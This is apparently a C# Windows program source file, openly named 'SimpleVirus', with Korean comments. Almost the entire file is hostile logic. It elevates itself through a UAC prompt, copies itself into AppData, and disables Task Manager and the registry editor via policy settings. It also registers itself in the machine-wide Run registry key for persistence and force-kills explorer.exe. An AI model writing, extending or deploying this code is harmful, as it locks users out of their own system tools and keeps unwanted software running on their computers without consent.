using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Principal;

namespace SimpleVirus
{
    internal static class Program
    {
        public static string ApplicationName { get; } = "SimpleVirus";


        /// <summary>
        /// 프로그램 시작지점
        /// </summary>
        [STAThread]
        public static void Main()
        {
            Initialize();

            ApplicationConfiguration.Initialize();
            Application.Run(new MainForm());
        }

        /// <summary>
        /// 프로그램 초기화 함수
        /// </summary>
        private static void Initialize()
        {
            string workDir = Path.Combine(Environment.GetFolderPath(
                Environment.SpecialFolder.ApplicationData), ApplicationName);

            if (Application.StartupPath != workDir)
            {
                SelfReplication(workDir);

                Policies.SetPoliciesSetting(PoliciesType.TaskManager, false);
                Policies.SetPoliciesSetting(PoliciesType.RegistryTools, false);

                SetStartUp(ApplicationName, Path.Combine(workDir, ApplicationName + ".exe"), true);

                Process.Start("taskkill", "/f /im explorer.exe");
            }
        }

        /// <summary>
        /// 프로그램을 다른위치로 복사
        /// </summary>
        /// <param name="destinationDir">도착할 위치</param>
        private static void SelfReplication(string destinationDir)
        {
            if (IsAdministrator() == false)
            {
                try
                {
                    ProcessStartInfo info = new()
                    {
                        UseShellExecute = true,
                        FileName = Application.ExecutablePath,
                        Verb = "runas"
                    };

                    Process.Start(info);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ApplicationName,
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Application.Exit();
                }
            }
            else
            {
                if (Directory.Exists(destinationDir))
                {
                    Directory.Delete(destinationDir, true);
                    CopyDirectory(Application.StartupPath, destinationDir, true);
                }
            }
        }

        /// <summary>
        /// 폴더를 다른 위치로 복사
        /// </summary>
        /// <param name="sourceDir">복사할 폴더 위치</param>
        /// <param name="destinationDir">도착할 폴더 위치</param>
        /// <param name="recursive">재귀적 실행</param>
        private static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
        {
            DirectoryInfo dirInfo = new(sourceDir);

            if (!dirInfo.Exists )
                return;

            DirectoryInfo[] dirs = dirInfo.GetDirectories();
            Directory.CreateDirectory(destinationDir);

            foreach (FileInfo file in dirInfo.GetFiles())
            {
                string targetFilePath = Path.Combine(destinationDir, file.Name);
                file.CopyTo(targetFilePath);
            }

            if (recursive)
            {
                foreach (DirectoryInfo subDir in dirs)
                {
                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                }
            }
        }

        /// <summary>
        /// 프로그램을 시작프로그램에 등록
        /// </summary>
        /// <param name="programName">애플리케이션 이름</param>
        /// <param name="programPath">애플리케이션 위치</param>
        /// <param name="enable">활성화 여부</param>
        private static void SetStartUp(string programName, string programPath, bool enable)
        {
            const string registryKeyPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            string keyValue = programName;
            
            RegistryKey objRegistryKey = Registry.LocalMachine.CreateSubKey(registryKeyPath);

            if (enable && objRegistryKey.GetValue(keyValue) == null)
                objRegistryKey.SetValue(keyValue, programPath);
            else if (!enable)
                objRegistryKey.DeleteValue(keyValue);

            objRegistryKey.Close();
        }

        /// <summary>
        /// 관리자 권한 여부 확인
        /// </summary>
        /// <returns>관리자 권한 여부</returns>
        private static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            
            if (identity != null)
            {
                WindowsPrincipal principal = new(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }

            return false;
        }
    }
}
